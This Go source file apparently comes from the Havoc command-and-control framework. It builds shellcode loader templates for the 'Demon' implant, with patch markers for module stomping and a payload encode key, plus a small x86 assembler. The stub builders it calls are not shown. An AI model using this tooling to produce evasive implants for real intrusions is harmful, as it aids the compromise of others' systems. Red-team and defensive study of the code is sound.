// build_loader.go assembles the raw shellcode loader templates
// (payloads/Shellcode.x64.bin / Shellcode.x86.bin) from the legacy prebuilt
// code body plus the new loader stubs the teamserver patches at build time
// (module stomping target + enable flag, payload encode key, fixed template
// size so the Demon DLL is appended at the same offset the loader computes).
//
// Run from payloads/Shellcode:
//
//	go run Tools/build_loader.go x64
//	go run Tools/build_loader.go x86
//	go run Tools/build_loader.go all
//
// The code body (first templateCodeSize bytes of the existing .bin, i.e.
// everything before the zero padding) is reused untouched; only the new stub
// appended after it is assembled here. The stub entry point offset is
// back-patched into the body's call-to-Entry at offset 13.
package main

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"os"
	"path/filepath"
)

const (
	templateSize     = 0x800
	templateCodeSize = 0x470
	entryCallOff     = 13 // rel32 operand offset of "call Entry" in the body
)

type arch struct {
	bodyBin   string
	outBin    string
	stub      []byte
	stubEntry int // offset of StubEntry within stub
}

func main() {
	if len(os.Args) != 2 {
		fmt.Fprintf(os.Stderr, "usage: build_loader <x64|x86|all>\n")
		os.Exit(1)
	}
	target := os.Args[1]

	x64 := arch{bodyBin: "../Shellcode.x64.bin", outBin: "../Shellcode.x64.bin"}
	x64.stub, x64.stubEntry = buildStubX64(templateCodeSize)

	x86 := arch{bodyBin: "../Shellcode.x86.bin", outBin: "../Shellcode.x86.bin"}
	x86.stub, x86.stubEntry = buildStubX86(templateCodeSize)

	switch target {
	case "x64":
		must(buildOne(x64))
	case "x86":
		must(buildOne(x86))
	case "all":
		must(buildOne(x64))
		must(buildOne(x86))
	default:
		fatal(fmt.Errorf("unknown target %q", target))
	}
}

func must(err error) {
	if err != nil {
		fatal(err)
	}
}

func fatal(err error) {
	fmt.Fprintln(os.Stderr, "error:", err)
	os.Exit(1)
}

func buildOne(a arch) error {
	body, err := os.ReadFile(a.bodyBin)
	if err != nil {
		return fmt.Errorf("read body %s: %w", a.bodyBin, err)
	}
	if len(body) < templateCodeSize {
		return fmt.Errorf("body too small: %d bytes", len(body))
	}
	code := body[:templateCodeSize]

	slot := binary.LittleEndian.Uint32(code[entryCallOff:])
	if code[entryCallOff-1] != 0xE8 || slot < 0 || slot > 0x1000 {
		return fmt.Errorf("unexpected body header (call rel32 = 0x%x)", slot)
	}

	entryVA := templateCodeSize + a.stubEntry
	rel := int64(entryVA) - int64(entryCallOff+4)
	if rel < -0x80000000 || rel > 0x7fffffff {
		return fmt.Errorf("entry rel32 out of range: %d", rel)
	}
	patched := make([]byte, len(code))
	copy(patched, code)
	binary.LittleEndian.PutUint32(patched[entryCallOff:], uint32(int32(rel)))

	if len(a.stub)+templateCodeSize > templateSize {
		return fmt.Errorf("stub too large: body 0x%x + stub 0x%x > 0x%x", templateCodeSize, len(a.stub), templateSize)
	}

	out := make([]byte, 0, templateSize)
	out = append(out, patched...)
	out = append(out, a.stub...)
	for len(out) < templateSize {
		out = append(out, 0x00)
	}

	abs, _ := filepath.Abs(a.outBin)
	if err := os.WriteFile(a.outBin, out, 0644); err != nil {
		return fmt.Errorf("write %s: %w", abs, err)
	}

	fmt.Printf("[*] %s: %d bytes (code 0x%x + stub 0x%x, entry -> 0x%x)\n", abs, len(out), templateCodeSize, len(a.stub), entryVA)
	verify(out)
	return nil
}

// sanity checks mirroring the teamserver patcher expectations
func verify(tpl []byte) {
	checks := []struct {
		name string
		ok   bool
	}{
		{"stomp target marker", bytes.Contains(tpl, widen("HAVOC_STOMP_TARGET", 22))},
		{"crypt key marker", bytes.Contains(tpl, padRight([]byte("HAVOC_CRYPT_KEY_MARKER"), 32))},
		{"end of code tag", bytes.Contains(tpl, []byte("ENDOFCODE"))},
	}
	for _, c := range checks {
		status := "ok"
		if !c.ok {
			status = "MISSING"
		}
		fmt.Printf("    %-22s %s\n", c.name, status)
	}
	if n := bytes.Count(tpl, []byte{0x0D}); n != 1 {
		fmt.Printf("    %-22s unexpected count %d\n", "stomp enabled marker", n)
	} else {
		fmt.Printf("    %-22s ok\n", "stomp enabled marker")
	}
}

func widen(s string, slots int) []byte {
	buf := make([]byte, 0, slots*2)
	for _, r := range s {
		buf = append(buf, byte(r), 0x00)
	}
	for len(buf) < slots*2 {
		buf = append(buf, 0x00, 0x00)
	}
	return buf
}

func padRight(b []byte, n int) []byte {
	out := make([]byte, n)
	copy(out, b)
	return out
}

// asmBuf is a tiny incremental assembler with label fixups for rel8/rel32
// branches and RIP-relative references. Labels are template-absolute offsets;
// stub-relative data access uses s.lbl (label at current position).
type asmBuf struct {
	buf    []byte
	labels map[string]int
	fixups []fixup
}

type fixup struct {
	off    int  // offset of the displacement field within buf
	target string
	kind   int // 0 = rel32 from next-ip, 1 = rip-rel32, 2 = rel8 from next-ip
}

func newAsmBuf() *asmBuf {
	return &asmBuf{labels: map[string]int{}}
}

func (a *asmBuf) pos() int { return len(a.buf) }

func (a *asmBuf) label(name string) {
	if _, ok := a.labels[name]; ok {
		panic("duplicate label " + name)
	}
	a.labels[name] = len(a.buf)
}

func (a *asmBuf) raw(b ...byte) { a.buf = append(a.buf, b...) }

// rel32To emits a rel32 displacement from the address immediately after the
// operand to the absolute template offset target.
func (a *asmBuf) rel32To(target int) {
	next := len(a.buf) + 4
	disp := int64(target) - int64(next)
	if disp < -0x80000000 || disp > 0x7fffffff {
		panic(fmt.Sprintf("rel32 out of range: from 0x%x to 0x%x", next, target))
	}
	var tmp [4]byte
	binary.LittleEndian.PutUint32(tmp[:], uint32(int32(disp)))
	a.buf = append(a.buf, tmp[:]...)
}

// jcc8 emits a short conditional jump (0x70|cc) with a label fixup.
func (a *asmBuf) jcc8(cc byte, target string) {
	a.buf = append(a.buf, 0x70|cc)
	a.fixups = append(a.fixups, fixup{off: len(a.buf), target: target, kind: 2})
	a.buf = append(a.buf, 0x00)
}

// jmp8 emits a short unconditional jump (0xEB) with a label fixup.
func (a *asmBuf) jmp8(target string) {
	a.buf = append(a.buf, 0xEB)
	a.fixups = append(a.fixups, fixup{off: len(a.buf), target: target, kind: 2})
	a.buf = append(a.buf, 0x00)
}

// jcc32 emits a near conditional jump (0x0F 0x80|cc) with a label fixup.
func (a *asmBuf) jcc32(cc byte, target string) {
	a.buf = append(a.buf, 0x0F, 0x80|cc)
	a.fixups = append(a.fixups, fixup{off: len(a.buf), target: target, kind: 0})
	var tmp [4]byte
	a.buf = append(a.buf, tmp[:]...)
}

// jmp32 emits a near unconditional jump (0xE9) with a label fixup.
func (a *asmBuf) jmp32(target string) {
	a.buf = append(a.buf, 0xE9)
	a.fixups = append(a.fixups, fixup{off: len(a.buf), target: target, kind: 0})
	var tmp [4]byte
	a.buf = append(a.buf, tmp[:]...)
}

// call32 emits a near call (0xE8) with a label fixup.
func (a *asmBuf) call32(target string) {
	a.buf = append(a.buf, 0xE8)
	a.fixups = append(a.fixups, fixup{off: len(a.buf), target: target, kind: 0})
	var tmp [4]byte
	a.buf = append(a.buf, tmp[:]...)
}

// ripRelTo emits opcode bytes followed by a RIP-relative displacement to a label.
func (a *asmBuf) ripRelLabel(opcode []byte, target string) {
	a.buf = append(a.buf, opcode...)
	a.fixups = append(a.fixups, fixup{off: len(a.buf), target: target, kind: 1})
	var tmp [4]byte
	a.buf = append(a.buf, tmp[:]...)
}

// ripRelToAbs emits opcode bytes followed by a RIP-relative displacement to an
// absolute template offset.
func (a *asmBuf) ripRelToAbs(target int, opcode ...byte) {
	a.buf = append(a.buf, opcode...)
	next := len(a.buf) + 4
	disp := int64(target) - int64(next)
	if disp < -0x80000000 || disp > 0x7fffffff {
		panic(fmt.Sprintf("rip-rel out of range: from 0x%x to 0x%x", next, target))
	}
	var tmp [4]byte
	binary.LittleEndian.PutUint32(tmp[:], uint32(int32(disp)))
	a.buf = append(a.buf, tmp[:]...)
}

func (a *asmBuf) wideString(s string, slots int) {
	a.buf = append(a.buf, widen(s, slots)...)
}

func (a *asmBuf) asciiStringPadded(s string, n int) {
	a.buf = append(a.buf, padRight([]byte(s), n)...)
}

func (a *asmBuf) asciiZ(s string) {
	a.buf = append(a.buf, []byte(s)...)
	a.buf = append(a.buf, 0x00)
}

func (a *asmBuf) bytes() []byte { return a.buf }

// resolve applies all label fixups; call once assembly is complete.
func (a *asmBuf) resolve() {
	for _, f := range a.fixups {
		t, ok := a.labels[f.target]
		if !ok {
			panic("undefined label " + f.target)
		}
		next := f.off + 4
		disp := int64(t) - int64(next)
		if f.kind == 2 {
			next = f.off + 1
			disp = int64(t) - int64(next)
			if disp < -0x80 || disp > 0x7f {
				panic(fmt.Sprintf("rel8 out of range to %s: %d", f.target, disp))
			}
			a.buf[f.off] = byte(int8(disp))
			continue
		}
		if disp < -0x80000000 || disp > 0x7fffffff {
			panic(fmt.Sprintf("rel32 out of range to %s: %d", f.target, disp))
		}
		var tmp [4]byte
		binary.LittleEndian.PutUint32(tmp[:], uint32(int32(disp)))
		copy(a.buf[f.off:f.off+4], tmp[:])
	}
}

// labelAbs returns the template-absolute offset of a label (stub base + offset).
func (a *asmBuf) labelAbs(name string, stubBase int) int {
	off, ok := a.labels[name]
	if !ok {
		panic("undefined label " + name)
	}
	return stubBase + off
}
